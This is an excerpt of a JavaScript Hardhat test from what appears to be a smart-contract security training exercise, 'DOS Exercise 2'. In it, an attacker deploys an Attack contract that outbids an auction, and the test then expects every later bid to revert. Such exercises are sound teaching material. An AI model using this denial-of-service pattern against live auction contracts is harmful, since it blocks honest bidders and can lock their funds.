...
describe("DOS Exercise 2", function () {
  ...
  it("Exploit", async function () {
    ...
    const AttackFactory = await ethers.getContractFactory(
      "contracts/dos-2/Attack.sol:Attack",
      attacker
    );

    let currentHighestBid = this.auction.highestBid();
    this.attack = await AttackFactory.deploy(this.auction.address, {
      value: currentHighestBid.add(ethers.utils.parseEther("0.000001")),
    });
  });
  ...
  after(async function () {
    ...
    await expect(
      this.auction.connect(user1).bid({ value: highestBid.mul(3) })
    ).to.be.reverted;
